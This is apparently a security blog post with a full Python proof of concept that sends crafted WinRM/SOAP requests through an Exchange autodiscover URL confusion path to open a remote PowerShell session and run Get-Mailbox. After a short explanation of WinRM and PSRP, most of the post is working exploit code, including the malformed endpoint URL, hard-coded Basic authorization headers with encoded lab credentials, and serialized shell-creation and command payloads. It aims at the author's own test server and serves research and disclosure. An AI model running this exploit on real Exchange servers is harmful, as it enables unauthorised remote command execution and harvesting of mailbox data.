---
layout: post
title:  "POC-winrmShell"
---

The exploit has the ability to remotely execute a command in the exchange powershell via HTTP request. The requirement for this exploit is the username and password of the user since the user needs to be authenticated to access WinRM.

In order to successfully execute the command and get the command output, about four requests are sent:

1. The shell is created on the exchange server and the shell id is returned in response
2. Receive data from the server.
3. The powershell command is executed in the exchange powershell.
4. The output of the command is returned in the response after sending the fourth request.

## What is Windows Remote Management

Windows Remote Management (WinRM) is a feature of Windows Vista that allows administrators to remotely run management scripts. It handles remote connections by means of the WS-Management Protocol, which is based on SOAP (Simple Object Access Protocol). WinRM has features similar to those of Windows Management Instrumentation (WMI) that was installed on all computers using Windows Millennium Edition (Me), Windows 2000, Windows XP or Windows Server 2003.

Windows Remote Management (WinRM) service implements the WS-Management protocol for remote management. WS-Management is a standard web services protocol used for remote software and hardware management. The WinRM service listens on the network for WS-Management requests and processes them. The WinRM Service needs to be configured with a listener using winrm.cmd command line tool or through Group Policy in order for it to listen over the network. The WinRM service provides access to WMI data and enables event collection. Event collection and subscription to events require that the service is running. WinRM messages use HTTP and HTTPS as transports. The WinRM service does not depend on IIS but is preconfigured to share a port with IIS on the same machine. The WinRM service reserves the /wsman URL prefix. To prevent conflicts with IIS, administrators should ensure that any websites hosted on IIS do not use the /wsman URL prefix.

![winrm-architecture.png](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/POC-winrmShell/winrm-architecture.png)

## Exploit endpoint

The payload will be sent as a POST request to [`dc.darksys[.]com`](http://dc.darksys.com) domain which is the exchange server setup to test this exploit. The full endpoint URL is as follows:

```vbnet
**https://dc.darksys.com/autodiscover/autodiscover.json?@fucky0u.edu/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3f@fucky0u.edu**
```

The headers for each request will remain the same except for the Content-Length :

```vbnet
headers = {
    'User-Agent' : 'Microsoft WinRM Client',
    'Authorization' : 'Basic ZGFya3N5c1xIYW1hZDpQYXNzd29yZEAxMjM=',
    'Content-Type': 'application/soap+xml;charset=UTF-8',
    'Host': 'dc.darksys.com',
    'Expect': '100-continue',
    'Connection': 'Keep-Alive',
    'X-Forwarded-For': 'dc.darksys.com',  
}
headers["Content-Length"] = str(len(soap_data))
```

The SOAP XML will be sent in the data since it is required by **WinRM**. The code will be placed in a function named  `sendPostRequest`  in the POC, refer to Figure 1.

![Figure 1: sendPostRequest function](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/POC-winrmShell/Untitled.png )

Figure 1: sendPostRequest function

## Creating the shell

The first POST request will contain SOAP XML which is responsible for creating the shell on the exchange server, refer to Figure 2. The shell id can be extracted from the response XML. In the `creationXml` tag, the value is base64 encoded data. This base64-encoded data is the serialized PSRP. 

PSRP (PowerShell Remoting Protocol) ********is a protcol for PowerShell that allows a lot of flexibility in executing commands with many arguments or large strings. 

![Figure 2: First SOAP XML sent in a POST request to create the shell](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/POC-winrmShell/Untitled%201.png)

Figure 2: First SOAP XML sent in a POST request to create the shell

For more information about Remote shells, read:

[https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsmv/593f3ed0-0c7a-4158-a4be-0b429b597e31](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wsmv/593f3ed0-0c7a-4158-a4be-0b429b597e31)

![Figure 3: PSRP for first request ](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/POC-winrmShell/Untitled%202.png)

Figure 3: PSRP for first request 

In Figure 3, two PSRP messages are used “SESSION_CAPABILITY” and “INIT_RUNSPACEPOOL”. These two are required by the “creationXml” tag in the SOAP XML. See, [https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/4b273725-2b60-4470-bca6-587644978a85](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/4b273725-2b60-4470-bca6-587644978a85)

“SESSION_CAPABILITY” and “INIT_RUNSPACEPOOL” are first serialized, then converted to base64. The base64 data is placed in the value of “creationXml” tag. 

## Second Request: Receiving data from WinRM

In order to verify that the shell has been successfully created and the next request (third request) can be sent, the response of this request can be checked for the keyword “RunspaceState”. If the keyboard is found, the next request can be sent, refer to Figure 4.

![Figure 4: Checking the response of second request.](https://raw.githubusercontent.com/darksys0x/darksys0x.github.io/master/_posts/imgs/POC-winrmShell/Untitled%203.png)

Figure 4: Checking the response of second request.

## How to enable Winrm

[https://techexpert.tips/powershell/powershell-remote-commands-winrm/](https://techexpert.tips/powershell/powershell-remote-commands-winrm/)

## Source Code

```python
import requests
#from requests_toolbelt.adapters import host_header_ssl
import base64
import re
import xml.dom.minidom
import uuid
import struct
import sys
import time
import random
import string

def sendPostRequest(data):
	url = 'https://dc.darksys.com/autodiscover/autodiscover.json?@fucky0u.edu/PowerShell?serializationLevel=Full;ExchClientVer=15.2.922.7;clientApplication=ManagementShell;TargetServer=;PSVersion=5.1.17763.592&Email=autodiscover/autodiscover.json%3f@fucky0u.edu'
	headers = {
	    'User-Agent' : 'Microsoft WinRM Client',
	    'Authorization' : 'Basic ZGFya3N5c1xhZG1pbmlzdHJhdG9yOlBhc3N3b3JkQDEyMw==',
	    'Content-Type': 'application/soap+xml;charset=UTF-8',
	    'Host': 'dc.darksys.com',
	    'Expect': '100-continue',
	    'Connection': 'Keep-Alive',
	    'X-Forwarded-For': 'dc.darksys.com',  
	}
	headers["Content-Length"] = str(len(data))
	x = requests.post(url, headers = headers, data = data, verify = False)
	print("length = %s" % (headers["Content-Length"]))
	return x

def print_error_and_exit(error, r):
	print ('[+] ', repr(error))
	if r is not None:
		print ('[+] status_code: ', r.status_code)
		print ('[+] response headers: ', repr(r.headers))
		print ('[+] response: ', repr(r.text))
	raise Exception("exploit failed")

class BasePacket:
	def __init__(self, ObjectId = 0, Destination = 2, MessageType = 0, RPID = None, PID = None, Data = ""):
		self.ObjectId = ObjectId
		self.FragmentId = 0
		self.Flags = "\x03"
		self.Destination = Destination
		self.MessageType = MessageType
		self.RPID = RPID
		self.PID = PID
		self.Data = Data

	def __str__(self):
		return "ObjectId: " + str(self.ObjectId) + ", FragmentId: " + str(self.FragmentId) + ", MessageType: " + str(self.MessageType) + ", RPID: " + str(self.RPID) + ", PID: " + str(self.PID) + ", Data: " + self.Data

	def serialize(self):
		Blob = ''.join([struct.pack('I', self.Destination),
				struct.pack('I', self.MessageType),
				self.RPID.bytes_le,
				self.PID.bytes_le,
				self.Data
			])
		BlobLength = len(Blob)
		output = ''.join([struct.pack('>Q', self.ObjectId),
			struct.pack('>Q', self.FragmentId),
			self.Flags,
			struct.pack('>I', BlobLength),
			Blob ])
		return output 

	def deserialize(self, data):
		total_len = len(data)

		i = 0 
		self.ObjectId = struct.unpack('>Q', data[i:i+8])[0]
		i = i + 8
		self.FragmentId = struct.unpack('>Q', data[i:i+8])[0]
		i = i + 8
		self.Flags = data[i]
		i = i + 1
		BlobLength = struct.unpack('>I', data[i:i+4])[0]
		i = i + 4
		Blob = data[i:i+BlobLength]
		lastIndex = i + BlobLength

		i = 0
		self.Destination = struct.unpack('I', Blob[i:i+4])[0]
		i = i + 4
		self.MessageType = struct.unpack('I', Blob[i:i+4])[0]
		i = i + 4
		self.RPID = uuid.UUID(bytes_le=Blob[i:i+16])
		i = i + 16
		self.PID =  uuid.UUID(bytes_le=Blob[i:i+16])
		i = i + 16
		self.Data = Blob[i:]

		return lastIndex

class SESSION_CAPABILITY(BasePacket):
	def __init__(self, ObjectId = 1, RPID = None, PID = None, Data = ""):
		self.Destination = 2
		self.MessageType = 0x00010002
		BasePacket.__init__(self, ObjectId, self.Destination, self.MessageType, RPID, PID, Data)

class INIT_RUNSPACEPOOL(BasePacket):
	def __init__(self, ObjectId = 1, RPID = None, PID = None, Data = ""):
		self.Destination = 2
		self.MessageType = 0x00010004
		BasePacket.__init__(self, ObjectId, self.Destination, self.MessageType, RPID, PID, Data)

class CreationXML:
	def __init__(self, sessionCapability, initRunspacPool):
		self.sessionCapability = sessionCapability
		self.initRunspacPool = initRunspacPool

	def serialize(self):
		output = self.sessionCapability.serialize() + self.initRunspacPool.serialize()
		return base64.b64encode(output)

	def deserialize(self, data):
		rawdata = base64.b64decode(data)
		lastIndex = self.sessionCapability.deserialize(rawdata)
		self.initRunspacPool.deserialize(rawdata[lastIndex:])

	def __str__(self):
		return self.sessionCapability.__str__() + self.initRunspacPool.__str__()

class PSCommand(BasePacket):
	def __init__(self, ObjectId = 1, RPID = None, PID = None, Data = ""):
		self.Destination = 2
		self.MessageType = 0x00021006
		BasePacket.__init__(self, ObjectId, self.Destination, self.MessageType, RPID, PID, Data)

def sendFirstSoapRequest(SessionId, RPID):
	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()

	PID = uuid.UUID('{00000000-0000-0000-0000-000000000000}')
	sessionData = """<Obj RefId="0"><MS><Version N="protocolversion">2.3</Version><Version N="PSVersion">2.0</Version><Version N="SerializationVersion">1.1.0.1</Version></MS></Obj>"""
	sessionCapability = SESSION_CAPABILITY(1, RPID, PID, sessionData)
	initData = """<Obj RefId="0"><MS><I32 N="MinRunspaces">1</I32><I32 N="MaxRunspaces">1</I32><Obj N="PSThreadOptions" RefId="1"><TN RefId="0"><T>System.Management.Automation.Runspaces.PSThreadOptions</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>Default</ToString><I32>0</I32></Obj><Obj N="ApartmentState" RefId="2"><TN RefId="1"><T>System.Threading.ApartmentState</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN><ToString>Unknown</ToString><I32>2</I32></Obj><Obj N="ApplicationArguments" RefId="3"><TN RefId="2"><T>System.Management.Automation.PSPrimitiveDictionary</T><T>System.Collections.Hashtable</T><T>System.Object</T></TN><DCT><En><S N="Key">PSVersionTable</S><Obj N="Value" RefId="4"><TNRef RefId="2" /><DCT><En><S N="Key">PSVersion</S><Version N="Value">5.1.19041.610</Version></En><En><S N="Key">PSEdition</S><S N="Value">Desktop</S></En><En><S N="Key">PSCompatibleVersions</S><Obj N="Value" RefId="5"><TN RefId="3"><T>System.Version[]</T><T>System.Array</T><T>System.Object</T></TN><LST><Version>1.0</Version><Version>2.0</Version><Version>3.0</Version><Version>4.0</Version><Version>5.0</Version><Version>5.1.19041.610</Version></LST></Obj></En><En><S N="Key">CLRVersion</S><Version N="Value">4.0.30319.42000</Version></En><En><S N="Key">BuildVersion</S><Version N="Value">10.0.19041.610</Version></En><En><S N="Key">WSManStackVersion</S><Version N="Value">3.0</Version></En><En><S N="Key">PSRemotingProtocolVersion</S><Version N="Value">2.3</Version></En><En><S N="Key">SerializationVersion</S><Version N="Value">1.1.0.1</Version></En></DCT></Obj></En></DCT></Obj><Obj N="HostInfo" RefId="6"><MS><Obj N="_hostDefaultData" RefId="7"><MS><Obj N="data" RefId="8"><TN RefId="4"><T>System.Collections.Hashtable</T><T>System.Object</T></TN><DCT><En><I32 N="Key">9</I32><Obj N="Value" RefId="9"><MS><S N="T">System.String</S><S N="V">Administrator: Windows PowerShell</S></MS></Obj></En><En><I32 N="Key">8</I32><Obj N="Value" RefId="10"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="11"><MS><I32 N="width">274</I32><I32 N="height">72</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">7</I32><Obj N="Value" RefId="12"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="13"><MS><I32 N="width">120</I32><I32 N="height">72</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">6</I32><Obj N="Value" RefId="14"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="15"><MS><I32 N="width">120</I32><I32 N="height">50</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">5</I32><Obj N="Value" RefId="16"><MS><S N="T">System.Management.Automation.Host.Size</S><Obj N="V" RefId="17"><MS><I32 N="width">120</I32><I32 N="height">3000</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">4</I32><Obj N="Value" RefId="18"><MS><S N="T">System.Int32</S><I32 N="V">25</I32></MS></Obj></En><En><I32 N="Key">3</I32><Obj N="Value" RefId="19"><MS><S N="T">System.Management.Automation.Host.Coordinates</S><Obj N="V" RefId="20"><MS><I32 N="x">0</I32><I32 N="y">0</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">2</I32><Obj N="Value" RefId="21"><MS><S N="T">System.Management.Automation.Host.Coordinates</S><Obj N="V" RefId="22"><MS><I32 N="x">0</I32><I32 N="y">9</I32></MS></Obj></MS></Obj></En><En><I32 N="Key">1</I32><Obj N="Value" RefId="23"><MS><S N="T">System.ConsoleColor</S><I32 N="V">5</I32></MS></Obj></En><En><I32 N="Key">0</I32><Obj N="Value" RefId="24"><MS><S N="T">System.ConsoleColor</S><I32 N="V">6</I32></MS></Obj></En></DCT></Obj></MS></Obj><B N="_isHostNull">false</B><B N="_isHostUINull">false</B><B N="_isHostRawUINull">false</B><B N="_useRunspaceHost">false</B></MS></Obj></MS></Obj>"""

	initRunspacPool = INIT_RUNSPACEPOOL(2, RPID, PID, initData)
	creationXml = CreationXML(sessionCapability, initRunspacPool).serialize()

	data = '''<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
	        <s:Header>
	            <a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
	            <w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
	            <a:ReplyTo>
	                    <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
	            </a:ReplyTo>
	            <a:Action s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action>
	            <w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
				<a:MessageID>uuid:{MessageID}</a:MessageID>
				<w:Locale xml:lang="en-US" s:mustUnderstand="false" />
				<p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
				<p:SessionId s:mustUnderstand="false">uuid:{SessionId}</p:SessionId>
				<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
				<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
				<w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" s:mustUnderstand="true">
					<w:Option Name="protocolversion" MustComply="true">2.3</w:Option>
				</w:OptionSet>
				<w:OperationTimeout>PT180.000S</w:OperationTimeout>
	        </s:Header>
	        <s:Body>
			<rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" Name="WinRM10" >
				<rsp:InputStreams>stdin pr</rsp:InputStreams>
				<rsp:OutputStreams>stdout</rsp:OutputStreams>
				<creationXml xmlns="http://schemas.microsoft.com/powershell">{creationXml}</creationXml>
			</rsp:Shell>
	        </s:Body>
	</s:Envelope>'''.format(OperationID=OperationID, MessageID=MessageID, SessionId=SessionId, creationXml=creationXml)
	res = sendPostRequest(data)
	if res.status_code == 200:
		doc = xml.dom.minidom.parseString(res.text);
		elements = doc.getElementsByTagName("rsp:ShellId")
		if len(elements) == 0:
			print_error_and_exit("create_powershell_shell failed with no ShellId return", res)
		ShellId = elements[0].firstChild.nodeValue
		print ("[+] Got ShellId success")
		return ShellId
	else:
		print_error_and_exit("create_powershell_shell failed", res)

def receive_data(SessionId, ShellId):
	print ("[+] Receive data util get RunspaceState packet")
	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()
	data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
	<s:Header>
		<a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
		<w:ResourceURI s:mustUnderstand="true">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
		<a:MessageID>uuid:{MessageID}</a:MessageID>
		<w:Locale xml:lang="en-US" s:mustUnderstand="false" />
		<p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
		<p:SessionId s:mustUnderstand="false">uuid:{SessionId}</p:SessionId>
		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
		<w:SelectorSet>
			<w:Selector Name="ShellId">{ShellId}</w:Selector>
		</w:SelectorSet>
		<w:OptionSet xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
			<w:Option Name="WSMAN_CMDSHELL_OPTION_KEEPALIVE">TRUE</w:Option>
		</w:OptionSet>
		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
	</s:Header>
	<s:Body>
		<rsp:Receive xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"  SequenceId="0">
			<rsp:DesiredStream>stdout</rsp:DesiredStream>
		</rsp:Receive>
	</s:Body>
</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId)
	r = sendPostRequest(data)
	if r.status_code == 200:
		print(r.text)
		doc = xml.dom.minidom.parseString(r.text);
		elements = doc.getElementsByTagName("rsp:Stream")
		if len(elements) == 0:
			print_error_and_exit("receive_data failed with no Stream return", r)
		for element in elements:
			stream = element.firstChild.nodeValue
			data = base64.b64decode(stream)
			data = unicode(data, errors='ignore')
			#data = data.decode('utf-8')
			print("base64 decoded DATa = ", data)
			if "RunspaceState" in data:
				print ("[+] Found RunspaceState packet")
				return True
		return False
		# print("[+] second soap packet success")
		# return True
	else:
		print_error_and_exit("receive_data failed", r)

def run_cmdlet_new_offlineaddressbook(SessionId, ShellId, RPID):
	PID = uuid.uuid4()
	# print '[+] Pipeline ID: ', PID
	print('[+] Create powershell pipeline')

	name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

	commandData = """<Obj RefId="0"><MS>
	<Obj N="PowerShell" RefId="1"><MS>
		<Obj N="Cmds" RefId="2">
			<TN RefId="0">
				<T>System.Collections.Generic.List`1[[System.Management.Automation.PSObject, System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]</T>
				<T>System.Object</T>
			</TN>
			<LST>
				<Obj RefId="3"><MS>
					<S N="Cmd">Get-Mailbox</S>
					<B N="IsScript">false</B>
					<Nil N="UseLocalScope" />
					<Obj N="MergeMyResult" RefId="4">
						<TN RefId="1">
							<T>System.Management.Automation.Runspaces.PipelineResultTypes</T>
							<T>System.Enum</T>
							<T>System.ValueType</T>
							<T>System.Object</T>
						</TN>
						<ToString>None</ToString><I32>0</I32>
					</Obj>
					<Obj N="MergeToResult" RefId="5"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
					<Obj N="MergePreviousResults" RefId="6"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
					<Obj N="MergeError" RefId="7"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
					<Obj N="MergeWarning" RefId="8"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
					<Obj N="MergeVerbose" RefId="9"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
					<Obj N="MergeDebug" RefId="10"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
					<Obj N="MergeInformation" RefId="11"><TNRef RefId="1" /><ToString>None</ToString><I32>0</I32></Obj>
					<Obj N="Args" RefId="12"><TNRef RefId="0" />
						<LST>
							<Obj RefId="13"><MS><S N="N">-OrganizationalUnit:</S><S N="V">Users</S></MS></Obj>
							<Obj RefId="14"><MS><S N="N">-ResultSize:</S><S N="V">unlimited</S></MS></Obj>
						</LST>
					</Obj>
				</MS></Obj>
			</LST>
		</Obj>
		<B N="IsNested">false</B>
		<Nil N="History" />
		<B N="RedirectShellErrorOutputPipe">true</B>
	</MS></Obj>
	<B N="NoInput">true</B>
	<Obj N="ApartmentState" RefId="15">
		<TN RefId="2"><T>System.Threading.ApartmentState</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN>
		<ToString>Unknown</ToString><I32>2</I32>
	</Obj>
	<Obj N="RemoteStreamOptions" RefId="16">
		<TN RefId="3"><T>System.Management.Automation.RemoteStreamOptions</T><T>System.Enum</T><T>System.ValueType</T><T>System.Object</T></TN>
		<ToString>0</ToString><I32>0</I32>
	</Obj>
	<B N="AddToHistory">true</B>
	<Obj N="HostInfo" RefId="17"><MS>
		<B N="_isHostNull">true</B>
		<B N="_isHostUINull">true</B>
		<B N="_isHostRawUINull">true</B>
		<B N="_useRunspaceHost">true</B></MS>
	</Obj>
	<B N="IsNested">false</B>
</MS></Obj>""".format(name=name)
	c = PSCommand(3, RPID, PID, commandData)
	command_arguments = base64.b64encode(c.serialize())
	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()
	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
	<s:Header>
		<a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize>
		<a:MessageID>uuid:{MessageID}</a:MessageID>
		<w:Locale xml:lang="en-US" s:mustUnderstand="false" />
		<p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
		<p:SessionId s:mustUnderstand="false">uuid:{SessionId}</p:SessionId>
		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
		<w:ResourceURI xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
		<w:SelectorSet xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
			<w:Selector Name="ShellId">{ShellId}</w:Selector>
		</w:SelectorSet>
		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
	</s:Header>
	<s:Body>
	<rsp:CommandLine xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" CommandId="{CommandId}" >
		<rsp:Command>Get-Mailbox</rsp:Command>
		<rsp:Arguments>{command_arguments}</rsp:Arguments>
	</rsp:CommandLine>
</s:Body>
</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId, CommandId=str(PID), command_arguments=command_arguments)

	r = sendPostRequest(request_data)
	if r.status_code == 200:
		print(r.text)
		doc = xml.dom.minidom.parseString(r.text)
		elements = doc.getElementsByTagName("rsp:CommandId")
		if len(elements) == 0:
			print_error_and_exit("run_cmdlet_new_offlineaddressbook failed with no CommandId return", r)
		CommandId = elements[0].firstChild.nodeValue
		# print "[+] Got CommandId: {CommandId}".format(CommandId=CommandId)
		print ("[+] Got CommandId success")
		return CommandId
	else:
		print_error_and_exit("run_cmdlet_new_offlineaddressbook failed", r)

def get_command_output(SessionId, ShellId, CommandId):
	MessageID = uuid.uuid4()
	OperationID = uuid.uuid4()
	request_data = """<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
	<s:Header>
		<a:To>https://exchange16.domaincorp.com:443/PowerShell?PSVersion=5.1.19041.610</a:To>
		<a:ReplyTo>
			<a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
		</a:ReplyTo>
		<a:Action s:mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action>
		<w:MaxEnvelopeSize s:mustUnderstand="true">512000</w:MaxEnvelopeSize><a:MessageID>uuid:{MessageID}</a:MessageID>
		<w:Locale xml:lang="en-US" s:mustUnderstand="false" />
		<p:DataLocale xml:lang="en-US" s:mustUnderstand="false" />
		<p:SessionId s:mustUnderstand="false">uuid:{SessionId}</p:SessionId>
		<p:OperationID s:mustUnderstand="false">uuid:{OperationID}</p:OperationID>
		<p:SequenceId s:mustUnderstand="false">1</p:SequenceId>
		<w:ResourceURI xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">http://schemas.microsoft.com/powershell/Microsoft.Exchange</w:ResourceURI>
		<w:SelectorSet xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd">
			<w:Selector Name="ShellId">{ShellId}</w:Selector>
		</w:SelectorSet>
		<w:OperationTimeout>PT180.000S</w:OperationTimeout>
	</s:Header>
	<s:Body>
		<rsp:Receive xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"  SequenceId="0">
			<rsp:DesiredStream CommandId="{CommandId}">stdout</rsp:DesiredStream>
		</rsp:Receive>
	</s:Body>
</s:Envelope>""".format(SessionId=SessionId, MessageID=MessageID, OperationID=OperationID, ShellId=ShellId, CommandId=CommandId)
	print("[!!!] ABOUT TO SEND POST REQ FOR GETTING CMD OUTPUT")
	r = sendPostRequest(request_data)
	print("\n\n===========RESPONSE===========\n\n")
	print(r.text)
	if r.status_code == 200:
		print("\n\nresponse status code is success\n\n")
		doc = xml.dom.minidom.parseString(r.text)
		elements = doc.getElementsByTagName("rsp:Stream")
		if len(elements) == 0:
			print_error_and_exit("get_command_output failed with no Stream return", r)
		return True
		# data = elements[0].firstChild.nodeValue
		# rawdata = base64.b64decode(data)
		# ret = re.search('<G N="Guid">(.*)</G>', rawdata)
		# if ret is None:
		# 	print_error_and_exit("get_command_output failed with no oab_guid return,\n\t\trawdata: " + repr(rawdata), r)
		# oab_guid = ret.group(1)
		# # print '[+] Found guid: ', oab_guid
		# print ('[+] Create new OAB success, got OAB_GUID')
		# return oab_guid
	else:
		print_error_and_exit("get_command_output failed", r)

def mainFunc():
	SessionId = uuid.uuid4()
	RPID = uuid.uuid4()
	ShellId = sendFirstSoapRequest(SessionId, RPID)
	print("ShellId = %s" %  ShellId)
	max_loop = 0
	while max_loop < 5: # prevent loop forever
		ret = receive_data(SessionId, ShellId)
		max_loop = max_loop + 1
		if ret: break
		if max_loop > 10:
			print_error_and_exit("create_new_addressbook failed with receive_data run forever", r=None)
			break
	CommandId = run_cmdlet_new_offlineaddressbook(SessionId, ShellId, RPID)
	print("%s, %s, %s"% (SessionId, ShellId, CommandId))
	print("[+] SessionId = %s, ShellId = %s, CommandId = %s" % (SessionId, ShellId, CommandId))
	print("[+] Sleeping for a few seconds")
	#time.sleep(10)
	get_command_output(SessionId, ShellId, CommandId)

mainFunc()
# SessionId = "d485f26b-288a-4972-ac94-1df2f8e1de91"					
# ShellId = "E2197419-B3DE-4265-9C48-CF313CCD2130"
# CommandId = "DC4F7F04-9B70-4A31-9A16-F54AF2D57E03"
# get_command_output(SessionId, ShellId, CommandId)
```